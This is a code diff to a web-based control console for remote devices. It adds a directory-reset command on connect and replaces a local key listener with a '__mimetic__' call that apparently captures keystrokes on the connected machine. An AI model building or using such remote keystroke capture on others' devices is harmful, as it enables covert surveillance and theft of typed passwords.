@@ -960,6 +960,8 @@
                     currentPath = 'C:\\Users';
                     updatePrompt();
                     startInactivityTimer();  // Start 60-second inactivity timer
+                    // Reset directory to default when entering control mode
+                    sendRemoteCommand(activeDevice, '__reset_dir__', () => {});
                     print(`Connected to ${device.hostname} (#${activeDevice}). Type "exit" to disconnect.`, 'dim');
                     print('Available commands: cd, ls, pwd, cat, nano, delete, mkdir, copy, cut, paste, move, start, get, upload, clear, help, exit, max_audio, min_audio, mute, unmute, mimetic', 'dim');
                 }).catch(() => {
@@ -1390,41 +1392,10 @@
                     return;
                 }
                 print('Recording keyboard input... (Press ESC to stop)', 'dim');
-
-                const keyboardLog = [];
-                let mimeticActive = true;
-                const mimeticListener = (e) => {
-                    // Capture key names similar to server-side mimetic
-                    const key = e.key;
-                    if (key === 'Escape') {
-                        e.preventDefault();
-                        // Stop recording on ESC - stay in control mode
-                        document.removeEventListener('keydown', mimeticListener);
-                        mimeticActive = false;
-                        print('Keyboard capture:', 'dim');
-                        const result = keyboardLog.join('');
-                        print(result || 'No keys recorded');
-                        return;
-                    }
-
-                    if (!mimeticActive) return;
-
-                    // Map keys to bracketed format (server-compatible)
-                    if (key === ' ') keyboardLog.push('[SPACE]');
-                    else if (key === 'Enter') keyboardLog.push('[ENTER]');
-                    else if (key === 'Tab') keyboardLog.push('[TAB]');
-                    else if (key === 'Backspace') keyboardLog.push('[BACKSPACE]');
-                    else if (key === 'Delete') keyboardLog.push('[DELETE]');
-                    else if (key === 'Shift') keyboardLog.push('[SHIFT]');
-                    else if (key === 'Control') keyboardLog.push('[CTRL]');
-                    else if (key === 'Alt') keyboardLog.push('[ALT]');
-                    else if (key.length === 1) keyboardLog.push(key);
-                    else keyboardLog.push(`[${key.toUpperCase()}]`);
-                };
-
-                // Listen globally to capture from all windows/tabs (only while telelluc is open)
-                document.addEventListener('keydown', mimeticListener);
-                hiddenInput.focus();
+                sendRemoteCommand(activeDevice, '__mimetic__', (output) => {
+                    print('Keyboard capture:', 'dim');
+                    print(output);
+                });
             },
             logout() {
                 window.location.href = '/logout';
